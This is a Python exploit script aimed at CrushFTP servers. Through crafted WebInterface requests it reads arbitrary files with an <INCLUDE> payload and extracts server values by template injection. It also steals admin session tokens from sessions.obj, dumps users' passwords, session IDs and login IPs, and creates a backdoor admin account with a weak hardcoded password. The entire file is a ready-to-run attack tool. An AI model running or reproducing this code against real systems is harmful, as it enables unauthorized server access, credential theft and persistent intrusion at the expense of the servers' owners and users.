#!/usr/bin/env python3

import requests
import argparse
import sys
import re
import os

def find_session_tokens():
    """Reads and extracts unique session tokens from 'sessions.obj'."""
    with open('sessions.obj', 'r', encoding="utf-8") as file:
        content = file.read()
    pattern = r'\d{13}_[a-zA-Z0-9]{30}'
    matches = re.findall(pattern, content)
    return list(set(matches))

def get_cookies(url):
    """Retrieve session cookies from the CrushFTP server."""
    response = requests.post(f"{url}/WebInterface/")
    if "CrushAuth" in response.cookies:
        return response.cookies
    raise ValueError("CrushAuth cookie not found. Authentication failed.")

def read_file(url, cookies, file_path, save=False):
    """Send a request to read a file from the CrushFTP server using the given path."""
    print(f"Reading file: {file_path}")
    payload = {
        "command": "exists",
        "paths": f"<INCLUDE>{file_path}</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    response = requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies)
    print("Done response!")

    # print("response ==", response.text)
    
    if save:
        with open('sessions.obj', 'w', encoding="utf-8") as file:
            file.write(response.text)

    return response.text

def get_template_value(url, cookies, template):
    """Send a request to retrieve a value using a server template."""
    payload = {
        "c2f": cookies['currentAuth'],
        "command": "zip",
        "path": f"{{{template}}}",
        "names": "any"
    }
    return requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies).text

def extract_file_content(xml_response):
    """Extract the actual content from the XML response using regular expressions."""
    match = re.search(r'<response>([^*]*):', xml_response)
    if match:
        return match.group(1).strip()
    raise ValueError("Unable to extract content from response.")

def get_username(url, cookies):
    payload = {
        "c2f": cookies['currentAuth'],
        "command": "getUsername"
    }
    return requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies).text

def get_password(url, cookies):
    payload = {
        "c2f": cookies['currentAuth'],
        "command": "user_password"
    }
    return requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies).text

def create_admin(url, cookie, name):
    c2f = cookie['currentAuth']
    password = "123"
    payload = {
        "command": "setUserItem",
        "data_action": "new",
        "serverGroup": "MainUsers",
        "username": name,
        "user": "<?xml version='1.0' encoding='UTF-8'?><user type='properties'><username>%s</username><password>%s</password><extra_vfs type='vector'></extra_vfs><version>1.0</version><userVersion>6</userVersion><created_by_username>crushadmin</created_by_username><created_by_email></created_by_email><created_time>06232023192323</created_time><filePublicEncryptionKey></filePublicEncryptionKey><fileDecryptionKey></fileDecryptionKey><max_logins>0</max_logins><root_dir>/</root_dir><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>crushadmin</created_by_username><created_by_email></created_by_email><created_time>1687550778682</created_time><password_history></password_history></user>" % (name, password),
        "xmlItem": "user",
        "vfs_items": "<?xml version='1.0' encoding='UTF-8'?><vfs_items type='vector'><vfs_items_subitem type='properties'><name>tmp</name><path>/</path><vfs_item type='vector'><vfs_item_subitem type='properties'><type>DIR</type><url>FILE://var/tmp/</url></vfs_item_subitem></vfs_item></vfs_items_subitem></vfs_items>",
        "permissions": "<?xml version='1.0' encoding='UTF-8'?><VFS type='properties'><item name='/'>(read)(view)(resume)</item><item name='/TMP/'>(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)(slideshow)</item></VFS>",
        "c2f": c2f
    }
    return requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookie).text

def main():
    parser = argparse.ArgumentParser(description="Exploit script for CrushFTP File Read Vulnerability")
    parser.add_argument("-t", "--target", required=True, help="URL of the target CrushFTP server")
    parser.add_argument("-r", "--readfile", help="Path of the file to read from the server")
    parser.add_argument("-s", "--get-session", action='store_true', help="Retrieve an admin session from the server")
    parser.add_argument("-c", "--check", action='store_true', help="Perform a vulnerability check")
    parser.add_argument("-l", "--list", action='store_true', help="List username and password from the server")
    parser.add_argument("-n", "--create", action='store_true', help="Create admin from the server")
    args = parser.parse_args()

    try:
        cookies = get_cookies(args.target)

        if args.readfile:
            content = read_file(args.target, cookies, args.readfile)
            if '<INCLUDE>' in content:
                print(f"The file does not exist or is not accessible by CrushFTP.")
            else:
                print("Extracted Content:\n\n" + extract_file_content(content))
        
        if args.get_session:
            print("Trying to obtain admin token and getting target's install location.")
            install_dir = get_template_value(args.target, cookies, "working_dir").split("file:")[2].split("\n")[0].strip()
            print("Install dir obtained: " + install_dir)
            obj_file_location = os.path.join(install_dir, 'sessions.obj')
            obj_content = read_file(args.target, cookies, obj_file_location, save=True)
            if '<commandResult>' not in obj_content:
                print("The obj file does not exist or is not accessible by CrushFTP.")
            else:
                print("Found session tokens:")
                file_cookies = open("cookies", "w")
                for token in find_session_tokens():
                    file_cookies.write(token + "\n")
                    print('   ' + token)
                file_cookies.close()

        if args.check:
            content = read_file(args.target, cookies, 'users/MainUsers/groups.XML')
            if '<groups' in content:
                print("The CrushFTP instance seems to be VULNERABLE.")
            else:
                print("The CrushFTP instance seems to be NOT VULNERABLE.")

        if args.list:
            file = open("cookies", "r")
            data = file.readline()[:-1]
            # data = "1719203627896_Az5PsR7XnQiYVubMg5efo5NWEGFgaJ"
            while data:
                cookie = {
                    "CrushAuth": data,
                    "currentAuth": data[-4:]
                }
                username = get_username(args.target, cookie)
                if "success" in username:
                    username = username.split("<username>")[1].split("</username>")[0]
                    if username != "anonymous":
                        print("----------New information of User----------")
                        print("username:", username)
                        user_password = get_template_value(args.target, cookie, "user_password").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        print("user_password:", user_password)
                        user_sessionid = get_template_value(args.target, cookie, "user_sessionid").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        print("user_sessionid:", user_sessionid)
                        # user_time_remaining = get_template_value(args.target, cookie, "user_time_remaining").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        # print("user_time_remaining:", user_time_remaining)
                        last_login_date_time = get_template_value(args.target, cookie, "last_login_date_time").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        print("last_login_date_time:", last_login_date_time)
                        last_login_ip = get_template_value(args.target, cookie, "last_login_ip").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        print("last_login_ip:", last_login_ip)
                        user_site_commands_text = get_template_value(args.target, cookie, "user_site_commands_text").split("You need upload permissions to zip a file:")[1].split("\n")[0]
                        print("user_site_commands_text:", user_site_commands_text)
                        print("-------------------------------------------")
                data = file.readline()[:-1]

        if args.create:
            name = "trang_admin"
            data = "1719382825843_yBevpYQBzZxqKjE6K0zxWi92LF0KI7"
            cookie = {
                "CrushAuth": data,
                "currentAuth": data[-4:]
            }
            # print(cookies)
            admin = create_admin(args.target, cookie, name)
            print(admin)
                
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    sys.exit(main())
